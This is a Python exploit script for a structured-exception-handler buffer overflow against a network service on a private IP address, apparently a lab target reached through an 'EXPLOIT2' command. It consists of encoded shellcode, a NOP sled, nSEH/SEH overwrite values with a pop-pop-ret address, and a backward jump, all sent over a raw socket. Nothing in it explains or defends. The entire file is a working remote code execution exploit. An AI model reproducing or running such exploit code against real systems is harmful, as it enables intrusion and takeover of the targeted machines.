#!/usr/bin/python
# -*- coding: utf-8 -*-

#badchars= \x00\x0a\x29\x50

import sys, socket
from struct import *

host = "192.168.0.106"
port = 7274

size = 4423

buf =  b""
buf += b"\xdb\xd0\xba\x9b\xcf\x99\xc3\xd9\x74\x24\xf4\x5d"
buf += b"\x31\xc9\xb1\x52\x31\x55\x17\x03\x55\x17\x83\x76"
buf += b"\x33\x7b\x36\x74\x24\xfe\xb9\x84\xb5\x9f\x30\x61"
buf += b"\x84\x9f\x27\xe2\xb7\x2f\x23\xa6\x3b\xdb\x61\x52"
buf += b"\xcf\xa9\xad\x55\x78\x07\x88\x58\x79\x34\xe8\xfb"
buf += b"\xf9\x47\x3d\xdb\xc0\x87\x30\x1a\x04\xf5\xb9\x4e"
buf += b"\xdd\x71\x6f\x7e\x6a\xcf\xac\xf5\x20\xc1\xb4\xea"
buf += b"\xf1\xe0\x95\xbd\x8a\xba\x35\x3c\x5e\xb7\x7f\x26"
buf += b"\x83\xf2\x36\xdd\x77\x88\xc8\x37\x46\x71\x66\x76"
buf += b"\x66\x80\x76\xbf\x41\x7b\x0d\xc9\xb1\x06\x16\x0e"
buf += b"\xcb\xdc\x93\x94\x6b\x96\x04\x70\x8d\x7b\xd2\xf3"
buf += b"\x81\x30\x90\x5b\x86\xc7\x75\xd0\xb2\x4c\x78\x36"
buf += b"\x33\x16\x5f\x92\x1f\xcc\xfe\x83\xc5\xa3\xff\xd3"
buf += b"\xa5\x1c\x5a\x98\x48\x48\xd7\xc3\x04\xbd\xda\xfb"
buf += b"\xd4\xa9\x6d\x88\xe6\x76\xc6\x06\x4b\xfe\xc0\xd1"
buf += b"\xac\xd5\xb5\x4d\x53\xd6\xc5\x44\x90\x82\x95\xfe"
buf += b"\x31\xab\x7d\xfe\xbe\x7e\xd1\xae\x10\xd1\x92\x1e"
buf += b"\xd1\x81\x7a\x74\xde\xfe\x9b\x77\x34\x97\x36\x82"
buf += b"\xdf\x58\x6e\x8c\x28\x31\x6d\x8c\x46\x20\xf8\x6a"
buf += b"\x0c\xb2\xad\x25\xb9\x2b\xf4\xbd\x58\xb3\x22\xb8"
buf += b"\x5b\x3f\xc1\x3d\x15\xc8\xac\x2d\xc2\x38\xfb\x0f"
buf += b"\x45\x46\xd1\x27\x09\xd5\xbe\xb7\x44\xc6\x68\xe0"
buf += b"\x01\x38\x61\x64\xbc\x63\xdb\x9a\x3d\xf5\x24\x1e"
buf += b"\x9a\xc6\xab\x9f\x6f\x72\x88\x8f\xa9\x7b\x94\xfb"
buf += b"\x65\x2a\x42\x55\xc0\x84\x24\x0f\x9a\x7b\xef\xc7"
buf += b"\x5b\xb0\x30\x91\x63\x9d\xc6\x7d\xd5\x48\x9f\x82"
buf += b"\xda\x1c\x17\xfb\x06\xbd\xd8\xd6\x82\xcd\x92\x7a"
buf += b"\xa2\x45\x7b\xef\xf6\x0b\x7c\xda\x35\x32\xff\xee"
buf += b"\xc5\xc1\x1f\x9b\xc0\x8e\xa7\x70\xb9\x9f\x4d\x76"
buf += b"\x6e\x9f\x47"

offset = "\x90" * 150
offset += buf
offset += "A" * (4423 - len(offset))

nseh  = "\x90\x90" # nops
nseh += "\xeb\x06" # JMP SHORT 0X08

seh = pack('<L',0x727417EA)  # ->  PPR

shellcode  = "\x90" * 8
shellcode += "\xE9\x2F\xEF\xFF\xFF" # JMP BACK PRA ESPACO MAIOR
shellcode += "\x90" * 8

payload = offset + nseh + seh + shellcode

buffer = "EXPLOIT2 "
buffer += payload

exp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
exp.connect((host, port))
print("Enviando %d bytes..." % (len(buffer)))
exp.send(buffer)

exp.close()


